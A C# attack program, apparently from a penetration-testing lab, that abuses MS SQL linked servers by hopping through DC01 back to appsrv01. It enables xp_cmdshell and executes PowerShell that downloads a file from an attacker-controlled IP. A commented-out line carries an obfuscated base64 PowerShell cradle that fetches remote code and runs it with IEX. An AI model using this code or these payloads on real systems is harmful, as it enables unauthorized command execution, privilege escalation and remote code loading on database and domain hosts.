using System;
using System.Data.SqlClient;

namespace SqlRevLink
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "appsrv01";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            //Finding linked servers at the target. We can use these to come back to our local server and possibly priv esc locally
            /*
            String execCmd = "EXEC ('sp_linkedservers') AT DC01;";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }

            reader.Close();
            */

            /*
            //See what context our user is executing in on the way back
            // This is broken. I cannot figure out the quotes. Giving up for now
            String execCmd = "select myuser from openquery(\"dc01\", 'select myuser from openquery(\"appsrv01\", ''select SYSTEM_USER as myuser'';') AT appsrv01') AT DC01";
            //select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }

            reader.Close();
            */

            //Shell on our local machine as SYTEM using the link on DC01 to come back and execute on our machine
            
            String enableadvoptions = "EXEC('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01";
            String enablexpcmdshell = "EXEC('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appsrv01') AT dc01";
            //String execmd = "EXEC('EXEC (''xp_cmdshell ''''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADgANAAvAHIAdQBuADYANAAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA='''';'') AT appsrv01') AT dc01";
            String execmd = "EXEC('EXEC (''xp_cmdshell ''''powershell -c wget http://192.168.49.206/test.txt -Outfile C:/Windows/Tasks/test.txt'''';'') AT appsrv01') AT dc01";

            SqlCommand command = new SqlCommand(enableadvoptions, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enablexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            
            con.Close();
        }
    }
}